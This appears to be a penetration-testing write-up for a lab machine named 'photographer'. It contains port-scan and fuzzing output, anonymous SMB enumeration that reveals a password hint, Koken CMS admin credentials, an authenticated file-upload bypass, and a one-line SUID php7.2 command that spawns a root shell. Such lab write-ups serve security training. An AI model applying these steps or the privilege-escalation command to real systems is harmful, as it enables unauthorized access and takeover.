**Hostname:** 
- `photographer`

**OS:**
- Ubuntu 16.04.6 LTS

**Users:**

```
agi
daisa
```

**Credentials:**

Koken admin:
```
daisa@photographer.com:babygirl
```


===============================================================

## Port Scan:

```
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Koken 0.22.24
|_http-title: daisa ahomi
MAC Address: 00:0C:29:D3:C5:44 (VMware)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-time: 
|   date: 2025-06-01T09:07:45
|_  start_date: N/A
|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: photographer
|   NetBIOS computer name: PHOTOGRAPHER\x00
|   Domain name: \x00
|   FQDN: photographer
|_  System time: 2025-06-01T05:07:46-04:00
```

## Recon:

### SMB

**Anonymous login enumeration**:
```
Share           Permissions     Remark
-----           -----------     ------
print$                          Printer Drivers
sambashare      READ            Samba on Ubuntu
IPC$                            IPC Service (photographer server (Samba, Ubuntu)) 
```

**Users identified:**
```
agi@photographer.com
daisa@photographer.com
```

**Mail message:**
```
Hi Daisa!
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

### Web port 80

- Nothing interesting here
#### Fuzzing:

**/FUZZ**
raft-medium-files.txt
```
 :: URL              : http://192.168.1.184/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

index.html              [Status: 200, Size: 5711, Words: 296, Lines: 190]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
.                       [Status: 200, Size: 5711, Words: 296, Lines: 190]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htgroup                [Status: 403, Size: 278, Words: 20, Lines: 10]
wp-forum.phps           [Status: 403, Size: 278, Words: 20, Lines: 10]
index.html.old          [Status: 200, Size: 11321, Words: 3503, Lines: 376]
.htaccess.bak           [Status: 403, Size: 278, Words: 20, Lines: 10]

```

**/FUZZ**/
raft-medium-directories.txt
```
 :: Method           : GET
 :: URL              : http://192.168.1.184/FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

images                  [Status: 200, Size: 2736, Words: 146, Lines: 26]
assets                  [Status: 200, Size: 1308, Words: 88, Lines: 19]
icons                   [Status: 403, Size: 278, Words: 20, Lines: 10]
```

### Web port 8000

#### Technologies:

CMS: **Koken 0.22.24**
Server: **Apache 2.4.18**
Database: **MySQL**
Languages: **PHP**

#### Fuzzing:

**/FUZZ**
raft-medium-files.txt
```
:: URL              : http://192.168.1.184:8000/FUZZ
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
:: Filter           : Response status: 404,302
________________________________________________

index.php               [Status: 200, Size: 4708, Words: 208, Lines: 97]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10]
api.php                 [Status: 500, Size: 600, Words: 39, Lines: 33]
```

**/FUZZ**/
raft-medium-directories.txt
```
admin                   [Status: 200, Size: 1020, Words: 65, Lines: 39]
tag                     [Status: 200, Size: 3246, Words: 160, Lines: 57]
category                [Status: 200, Size: 3269, Words: 157, Lines: 56]
page                    [Status: 500, Size: 2073, Words: 119, Lines: 58]
error                   [Status: 200, Size: 3160, Words: 153, Lines: 56]
archives                [Status: 301, Size: 0, Words: 1, Lines: 1]
app                     [Status: 200, Size: 114, Words: 5, Lines: 10]
content                 [Status: 200, Size: 4545, Words: 215, Lines: 90]
tags                    [Status: 200, Size: 3232, Words: 157, Lines: 56]
home                    [Status: 200, Size: 4666, Words: 207, Lines: 99]
favorites               [Status: 200, Size: 3277, Words: 157, Lines: 56]
index                   [Status: 200, Size: 4708, Words: 208, Lines: 97]
date                    [Status: 200, Size: 4504, Words: 212, Lines: 118]
icons                   [Status: 403, Size: 280, Words: 20, Lines: 10]
lightbox                [Status: 200, Size: 6452, Words: 196, Lines: 87]
storage                 [Status: 403, Size: 280, Words: 20, Lines: 10]
categories              [Status: 200, Size: 3286, Words: 157, Lines: 56]
album                   [Status: 200, Size: 3242, Words: 157, Lines: 56]
albums                  [Status: 200, Size: 3297, Words: 159, Lines: 57]
contents                [Status: 200, Size: 4505, Words: 213, Lines: 90]
set                     [Status: 200, Size: 3224, Words: 157, Lines: 56]
timeline                [Status: 200, Size: 7651, Words: 403, Lines: 197]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10]
essays                  [Status: 200, Size: 3295, Words: 159, Lines: 56]
sets                    [Status: 200, Size: 3234, Words: 157, Lines: 57]
```

### Machine enumeration:

#### Architecture
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6f072e70e3e49380ff4d43cdde8178c24cf73daa, stripped

Linux photographer 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

Ubuntu 16.04.6 LTS

```

**SUID binaries:**

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/php7.2
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/bin/su
```

## Foothold / Privilege Escalation:

### Initial Foothold

I was able to guess Koken CMS admin credentials through a misconfigured SMB share, which allowed anonymous login and contained a hint to admin credentials.

I got initial access through the vulnerable version of Koken CMS, which was vulnerable to an Authenticated File Upload Vulnerability. The input validation on file uploads depends only on whitelisting the extensions, I can edit the request with Burp and bypass this.\
[ExploitDB exploit](https://www.exploit-db.com/exploits/48706)

---

### Privilege Escalation:

While enumerating as the www-data user, I found that the binary **/usr/bin/php7.2** had a SUID bit set meaning it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. 
I searched on gtfobins and found an entry which I modifed into:
```
$ CMD="/bin/sh"
$ php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
#
```
[GTFObins link](https://gtfobins.github.io/gtfobins/php/#suid)


## Journal:

- Read carefully through SUID binaries